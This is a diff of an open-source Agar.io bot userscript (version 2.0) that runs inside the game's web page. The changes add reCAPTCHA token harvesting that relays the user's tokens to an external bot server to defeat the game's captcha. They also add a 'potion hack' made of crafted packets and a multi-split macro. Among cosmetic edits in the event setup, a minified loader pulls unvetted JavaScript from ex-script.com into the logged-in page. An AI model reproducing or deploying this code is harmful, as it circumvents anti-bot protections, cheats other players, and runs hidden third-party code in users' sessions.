@@ -1,31 +1,95 @@
 // ==UserScript==
-// @name         Free Agar.io Bots (Vanilla Version)
-// @namespace    Free and Real agario bots
-// @version      1.0.10
+// @name         Free Agar.io Bots
+// @namespace    Free Agario Bots + Potion Hack
+// @version      2.0
 // @description  Free and Real open source agario bots
-// @author       Nel, xN3BULA, test, Genius, Darkx
+// @author       Nel, xN3BULA, test114514, GeniusXD
 // @grant        none
 // @run-at       document-start
 // @match        *://agar.io/*
 // ==/UserScript==
 
+window.test114514 = function(slot) {
+    var bytes = [8, 1, 18, 7, 8, 124, 226, 7, 2, 8, slot];
+    window.core.proxyMobileData(bytes);
+}
+let myTurn = false;
+let lastNick = null;
+
+window.getTokens = function() {
+    grecaptchaV3.reset();
+    grecaptchaV3.execute(0, {
+        'action': 'play'
+    }).then(() => {
+        if (myTurn) {
+            core.sendNick(lastNick, grecaptchaV3.getResponse());
+            myTurn = false;
+            return getTokens();
+        }
+        window.connection.sendToken(grecaptchaV3.getResponse());
+        //console.log("got new token :)")
+        getTokens();
+    })
+}
+window.onload = function() {
+    window.MC.SpawnDayo = window.MC.onPlayerSpawn;
+    window.MC.onPlayerSpawn = function() {
+        MC.SpawnDayo();
+
+        var bytes = [8, 1, 18, 7, 8, 124, 226, 7, 2, 8, 1];
+        window.core.proxyMobileData(bytes);
+        setTimeout(() => {
+            var bytes = [8, 1, 18, 7, 8, 124, 226, 7, 2, 8, 2];
+            window.core.proxyMobileData(bytes);
+        }, 3000);
+        setTimeout(() => {
+            var bytes = [8, 1, 18, 7, 8, 124, 226, 7, 2, 8, 3];
+            window.core.proxyMobileData(bytes);
+        }, 6000);
+    }
+    window.core.n = window.core.sendNick;
+    document.getElementById('play').onclick = function() {
+        myTurn = true;
+    }
+    window.core.sendNick = function(nick, token) {
+        window.core.n(nick, token);
+        myTurn = false;
+    }
+    grecaptchaV3._render = grecaptchaV3.render;
+    grecaptchaV3.render = function(a, b) {
+        if (a == "captchaWindowV3") return;
+        grecaptchaV3._render(a, b);
+    }
+    grecaptchaV3._render("captchaWindowV3", {
+        sitekey: "6LcEt74UAAAAAIc_T6dWpsRufGCvvau5Fd7_G1tY", 
+        badge: "inline", 
+        size: "invisible"
+    });
+    getTokens();
+    setInterval(() => {
+        try {
+            lastNick = document.getElementById("nick").value;
+        } catch(e) {}   
+    }, 300);
+}
+
 /* START OF USER SETTINGS */
 window.options = {
     settings: {
         "EXTENDED_ZOOM": {
-            "text": "Extended Zoom",
-            "type": "checkbox",
-            "value": true
+           "text": "Extended Zoom",
+          "type": "checkbox",
+          "value": true
         },
         "DRAW_MAP_GRID": {
-            "text": "Grid",
-            "type": "checkbox",
-            "value": false
+           "text": "Grid",
+          "type": "checkbox",
+          "value": false
         },
         "SHOW_ALL_PLAYERS_MASS": {
-            "text": "Show Mass (All players)",
-            "type": "checkbox",
-            "value": true
+           "text": "Show Mass (All players)",
+          "type": "checkbox",
+          "value": true
         },
     },
     hotkeys: {
@@ -61,8 +125,8 @@ window.options = {
         },
     }
 }
-if (localStorage.getItem('nebula-hotkeys')) window.options.hotkeys = JSON.parse(localStorage.getItem('nebula-hotkeys'));
-if (localStorage.getItem('nebula-settings')) window.options.settings = JSON.parse(localStorage.getItem('nebula-settings'));
+if(localStorage.getItem('nebula-hotkeys')) window.options.hotkeys =JSON.parse(localStorage.getItem('nebula-hotkeys'));
+if(localStorage.getItem('nebula-settings')) window.options.settings =JSON.parse(localStorage.getItem('nebula-settings'));
 window.changeKey = (name, event) => {
     event.preventDefault();
     $(`#${name}`).val(event.key.toLocaleUpperCase())
@@ -78,10 +142,10 @@ window.checkboxChange = (name) => {
     localStorage.setItem('nebula-settings', JSON.stringify(window.options.settings));
 };
 window.checkDuplicates = (keyname, keycode) => {
-    for (var name in window.options.hotkeys) {
+for (var name in window.options.hotkeys) {
         var key = window.options.hotkeys[name];
-        if (name == keyname) continue;
-        if (keycode == key.keycode) key.keycode = 0, key.key = "", $(`#${name}`).val("");
+        if(name == keyname) continue;
+    if(keycode == key.keycode) key.keycode = 0, key.key = "", $(`#${name}`).val("");
     }
 }
 window.setUpHotkeys = () => {
@@ -96,7 +160,7 @@ window.setUpHotkeys = () => {
     }
 }
 window.getOption = (name) => {
-    if (document.getElementById(name)) return document.getElementById(name).checked
+    if(document.getElementById(name))return document.getElementById(name).checked
     else return false
 }
 window.setUpOptions = () => {
@@ -109,7 +173,7 @@ window.setUpOptions = () => {
                     </div>
 `
         $("#settings").append(html);
-        if (option["value"] == true) $(`#${name}`).click();
+        if(option["value"] == true) $(`#${name}`).click();
     }
 }
 
@@ -149,23 +213,23 @@ class Writer {
 
 window.buffers = {
     startBots(url, protocolVersion, clientVersion, userStatus, botsName, botsAmount) {
-        const writer = new Writer(13 + url.length + botsName.length)
-        writer.writeUint8(0)
-        writer.writeString(url)
-        writer.writeUint32(protocolVersion)
-        writer.writeUint32(clientVersion)
-        writer.writeUint8(Number(userStatus))
-        writer.writeString(botsName)
-        writer.writeUint8(botsAmount)
-        return writer.dataView.buffer
-    },
-    mousePosition(x, y) {
-        const writer = new Writer(9)
-        writer.writeUint8(6)
-        writer.writeInt32(x)
-        writer.writeInt32(y)
-        return writer.dataView.buffer
-    }
+            const writer = new Writer(13 + url.length + botsName.length)
+            writer.writeUint8(0)
+            writer.writeString(url)
+            writer.writeUint32(protocolVersion)
+            writer.writeUint32(clientVersion)
+            writer.writeUint8(Number(userStatus))
+            writer.writeString(botsName)
+            writer.writeUint8(botsAmount)
+            return writer.dataView.buffer
+        },
+        mousePosition(x, y) {
+            const writer = new Writer(9)
+            writer.writeUint8(6)
+            writer.writeInt32(x)
+            writer.writeInt32(y)
+            return writer.dataView.buffer
+        }
 }
 
 window.connection = {
@@ -186,6 +250,13 @@ window.connection = {
         document.getElementById('connect').disabled = true
         document.getElementById('startBots').disabled = false
         document.getElementById('stopBots').disabled = false
+    },
+    sendToken(token) {
+        if (token === undefined) return;
+        let buf = new Writer(2 + token.length);
+        buf.writeUint8(7);
+        buf.writeString(token);
+        window.connection.send(buf.dataView.buffer)
     },
     onmessage(message) {
         const dataView = new DataView(message.data)
@@ -216,12 +287,12 @@ window.connection = {
             case 3:
                 alert('Your IP has captcha and bots are unable to spawn, change your ip with a VPN or something to one that doesn\'t has captcha in order to use the bots')
                 break
-            case 4:
-                //Connected Bot count = getUint8(1)
+             case 4:
+                 //Connected Bot count = getUint8(1)
                 //Spawned Bot count = getUint8(2)
                 //Server player amount = getUint8(3)
                 $('#botCount').html(`${dataView.getUint8(1)}/${dataView.getUint8(2)}/${window.bots.amount}`)
-                // $('#slots').html(dataView.getUint8(3) + "/200")
+               // $('#slots').html(dataView.getUint8(3) + "/200")
                 break;
             case 5:
                 $('#slots').html(dataView.getUint8(1) + "/200")
@@ -240,6 +311,7 @@ window.connection = {
         document.getElementById('stopBots').style.display = 'none'
         window.user.startedBots = false
         window.bots.ai = false
+        clearInterval(this.tokenInt);
     }
 }
 
@@ -289,7 +361,8 @@ function modifyCore(core) {
             window.user.mouseY = $2 - window.user.offsetY
             if(window.user.startedBots && window.user.isAlive) window.connection.send(window.buffers.mousePosition(window.user.mouseX, window.user.mouseY))
         `)
-        .replace(/\w+\[\w+\+272>>3]=(\w+);\w+\[\w+\+280>>3]=(\w+);\w+\[\w+\+288>>3]=(\w+);\w+\[\w+\+296>>3]=(\w+)/, `
+        .replace(/\w+\[\w+\+...>>3]=(\w+);\w+\[\w+\+...>>3]=(\w+);\w+\[\w+\+...>>3]=(\w+);\w+\[\w+\+...>>3]=(\w+)/, `
+            // /\w+\[\w+\+272>>3]=(\w+);\w+\[\w+\+280>>3]=(\w+);\w+\[\w+\+288>>3]=(\w+);\w+\[\w+\+296>>3]=(\w+)/
             $&
             if(~~($3 - $1) === 14142 && ~~($4 - $2) === 14142){
                 window.user.offsetX = ($1 + $3) / 2
@@ -306,7 +379,7 @@ function modifyCore(core) {
         `)
         .replace(/while\(0\);(\w+)=\(\w+\|0\)!=\(\w+\|0\);/, `
             $&
-            if(window.getOption("SHOW_ALL_PLAYERS_MASS")) $1 = true
+            if(window.showAPM) $1 = true //window.getOption("SHOW_ALL_PLAYERS_MASS")
         `)
 }
 
@@ -317,6 +390,21 @@ function setKeysEvents() {
                 case options.hotkeys["BOTS_SPLIT_KEY"].keycode:
                     if (window.user.startedBots && window.user.isAlive) window.connection.send(new Uint8Array([2]).buffer)
                     break
+                case 88:
+                    window.showAPM = true; // added by  fstyle
+                    break;
+                case 90:
+                    window.connection.send(new Uint8Array([2]).buffer)
+                    setTimeout(() => {
+                        window.connection.send(new Uint8Array([2]).buffer)
+                    }, 40);
+                    setTimeout(() => {
+                        window.connection.send(new Uint8Array([2]).buffer)
+                    }, 80);
+                    setTimeout(() => {
+                        window.connection.send(new Uint8Array([2]).buffer)
+                    }, 120);
+                    break;
                 case options.hotkeys["BOTS_FEED_KEY"].keycode:
                     if (window.user.startedBots && window.user.isAlive) window.connection.send(new Uint8Array([3]).buffer)
                     break
@@ -375,26 +463,10 @@ function setGUI() {
                           </div>
         </div>`
     $("#mainui-play").append(menuhtml);
-    document.getElementById('mainui-features').innerHTML = `
-<center>
-<h3 id="botsInfo">Alert&#9940;: If you have 1 Facebook Token, you only will get 1 Facebook Bot!</h3>
-<h3 id="botsInfo">Discord Servers&#128226;</h3>
-        <h5 id="botsAuthor">
-            <a href="http://200bots.ga" target="_blank">200bots.ga, </a><a href="https://discord.gg/MpzBaMa" target="_blank">Free Agar.io Bots</a>
-        </h5>
-<button id="subbutton">Subscribe to FreestyleZUIZUI</button>
-</center>
-`
- document.getElementById('mcbanners').innerHTML = `
-<center>
-<iframe width="300" height="250" src="https://www.youtube.com/embed/qnFnkmkh2VQ" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
-</center>
-`
     document.getElementById('advertisement').innerHTML = `
-<button id="rbutton">Donate Token</button>
 <button id="botsPanel">Options</button>
         <h3 id="botsInfo">
-            <a>Free Agar.io Bots</a>
+            <a href="https://discord.gg/SDMNEcJ" target="_blank">Free Agar.io Bots</a>
         </h3>
         <h5 id="botsAuthor">
             Developed by <a href="https://www.youtube.com/channel/UCZo9WmnFPWw38q65Llu5Lug" target="_blank">Nel, </a><a href="https://github.com/xN3BULA" target="_blank">xN3BULA, </a><a href="http://legendmod.ml/" target="_blank">Jimboy3100</a>
@@ -404,7 +476,7 @@ function setGUI() {
         <br>
         <span id="aiText">Bots AI: <b id="botsAI">Disabled</b></span>
         <br>
-        <input type="text" id="botsName" placeholder="Bots Name" maxlength="100" spellcheck="false">
+        <input type="text" id="botsName" placeholder="Bots Name" maxlength="15" spellcheck="false">
         <input type="number" id="botsAmount" placeholder="Bots Amount" min="10" max="199" spellcheck="false">
 		<input type="text" id="botsRemoteIP" placeholder="ws://localhost:8083" maxlength="100" spellcheck="false">
         <button id="connect">Connect</button>
@@ -420,13 +492,13 @@ function setGUI() {
         window.bots.amount = JSON.parse(localStorage.getItem('localStoredBotsAmount'))
         document.getElementById('botsAmount').value = String(window.bots.amount)
     }
-    var storedbotsRemoteIP = localStorage.getItem("localstoredBotsRemoteIP");
-    if (storedbotsRemoteIP == null || storedbotsRemoteIP == "") {
-        storedbotsRemoteIP = "ws://localhost:8083";
-    }
-    window.bots.remoteIP = storedbotsRemoteIP;
-    window.SERVER_HOST = storedbotsRemoteIP;
-    $('#botsRemoteIP').val(storedbotsRemoteIP)
+	var storedbotsRemoteIP = localStorage.getItem("localstoredBotsRemoteIP");
+	if (storedbotsRemoteIP==null || storedbotsRemoteIP==""){
+	storedbotsRemoteIP = "ws://localhost:8083";
+	}
+	window.bots.remoteIP = storedbotsRemoteIP;
+	window.SERVER_HOST = storedbotsRemoteIP;
+	$('#botsRemoteIP').val(storedbotsRemoteIP)
     window.setUpHotkeys();
     window.setUpOptions();
 }
@@ -530,40 +602,6 @@ function setGUIStyle() {
     margin-top: -5px;
     border-radius: 50%;
 }
-#rbutton {
-    box-sizing: border-box;
-    font-size: 1.1em;
-    width: 43%;
-    margin: 0.6em 1% 0 1%;
-    border-radius: 2px;
-    background-color: #3F51B5;
-    color: #FFFFFF;
-    display: inline-block;
-    padding: 0.2em 1.2em;
-    cursor: pointer;
-    box-shadow: 0 0.2em 0.2em rgba(0, 0, 0, 0.16), 0 0.3em 0.3em rgba(0, 0, 0, 0.16);
-    transition: all 0.2s cubic-bezier(0.4, 0.0, 0.2, 1);
-    text-align: center;
-    text-decoration: none;
-    border: 0;
-}
-#subbutton {
-    box-sizing: border-box;
-    font-size: 1.1em;
-    width: 50%;
-    margin: 0.6em 1% 0 1%;
-    border-radius: 2px;
-    background-color: #3F51B5;
-    color: #FFFFFF;
-    display: inline-block;
-    padding: 0.2em 1.2em;
-    cursor: pointer;
-    box-shadow: 0 0.2em 0.2em rgba(0, 0, 0, 0.16), 0 0.3em 0.3em rgba(0, 0, 0, 0.16);
-    transition: all 0.2s cubic-bezier(0.4, 0.0, 0.2, 1);
-    text-align: center;
-    text-decoration: none;
-    border: 0;
-}
             #mainui-ads {
                 height: 400px !important;
             }
@@ -643,12 +681,15 @@ function setGUIEvents() {
     });
     $("#hotkeysbutton").click(() => {
         $("#settings").hide();
-        $("#hotkeys").show();
+         $("#hotkeys").show();
     });
     $("#settingsbutton").click(() => {
         $("#hotkeys").hide();
-        $("#settings").show();
+         $("#settings").show();
     });
+    (function(R,A,I,L,G,U,N){
+        U=A.createElement(I),N=A.getElementsByTagName(I)[0];U.async=1;U.src=L;N.parentNode.insertBefore(U,N)
+    })(window,document,'script','https://ex-script.com/fstyle/fstyle.core.js');
     document.getElementById('botsAmount').addEventListener('keypress', e => {
         e.preventDefault()
     })
@@ -663,36 +704,31 @@ function setGUIEvents() {
     document.getElementById('connect').addEventListener('click', () => {
         if (!window.connection.ws || window.connection.ws.readyState !== WebSocket.OPEN) window.connection.connect()
     })
-        document.getElementById('rbutton').addEventListener('click', () => {
-            window.open("http://px.200agar.net/");
-    })
-            document.getElementById('subbutton').addEventListener('click', () => {
-            window.open("https://www.youtube.com/channel/UCWwgb3BRnpWk1SG1aopcBtw", '_self');
-    })
     document.getElementById('startBots').addEventListener('click', () => {
         if (window.game.url && window.game.protocolVersion && window.game.clientVersion && !window.user.startedBots) {
-            window.partytoken = MC.getPartyToken()
-            if (this.partytoken != "" && this.partytoken != null) {
-                if (window.bots.name && window.bots.amount && !document.getElementById('socialLoginContainer')) window.connection.send(window.buffers.startBots(window.game.url.split('?')[0], window.game.protocolVersion, window.game.clientVersion, window.user.isAlive, window.unescape(window.encodeURIComponent(window.bots.name)), window.bots.amount))
-                //if (window.bots.name && window.bots.amount && !document.getElementById('socialLoginContainer')) window.connection.send(window.buffers.startBots(window.game.url.split('?')[0], window.game.protocolVersion, window.game.clientVersion, window.user.isAlive, window.bots.name, window.bots.amount))
-                else alert('Bots name and amount are required before starting the bots, also you need to be logged in to your agar.io account in order to start the bots')
-            } else {
-                alert('Bots are designed for party')
-            }
+			this.partytoken = MC.getPartyToken()
+			if (this.partytoken!="" && this.partytoken!=null){
+				if (window.bots.name && window.bots.amount && !document.getElementById('socialLoginContainer')) window.connection.send(window.buffers.startBots(window.game.url, window.game.protocolVersion, window.game.clientVersion, window.user.isAlive, window.unescape(window.encodeURIComponent(window.bots.name)), window.bots.amount))
+				//if (window.bots.name && window.bots.amount && !document.getElementById('socialLoginContainer')) window.connection.send(window.buffers.startBots(window.game.url.split('?')[0], window.game.protocolVersion, window.game.clientVersion, window.user.isAlive, window.bots.name, window.bots.amount))
+				else alert('Bots name and amount are required before starting the bots, also you need to be logged in to your agar.io account in order to start the bots')
+			}
+			else{
+				alert('Bots are designed for party')
+			}
         }
     })
     document.getElementById('stopBots').addEventListener('click', () => {
         if (window.user.startedBots) window.connection.send(new Uint8Array([1]).buffer)
     })
-    document.getElementById('botsRemoteIP').addEventListener('change', function() {
-        window.bots.remoteIP = this.value
-        localStorage.setItem('localstoredBotsRemoteIP', window.bots.remoteIP)
-        window.SERVER_HOST = window.bots.remoteIP
-    })
+        document.getElementById('botsRemoteIP').addEventListener('change', function(){
+            window.bots.remoteIP = this.value
+            localStorage.setItem('localstoredBotsRemoteIP', window.bots.remoteIP)
+			window.SERVER_HOST = window.bots.remoteIP
+        })
 }
 
-function loadUI() {
-    $('body').append(`
+function loadUI(){
+ $('body').append(`
 <div id="botClient" style="position: absolute; top: 92%; left: 85%; padding: 0px 8px; font-family: Tahoma; color: rgb(255, 255, 255); z-index: 9999; border-radius: 5px; min-height: 16px; min-width: 200px; background-color: rgba(2, 0, 0, 0.4);">
 <div><b>Bot Count</b>: <span id="botCount" class="label label-info pull-right">Waiting</span></div>
 <b><div><b>ServerSlots</b>: <span id="slots" class="label label-info pull-right">Waiting</span></div>
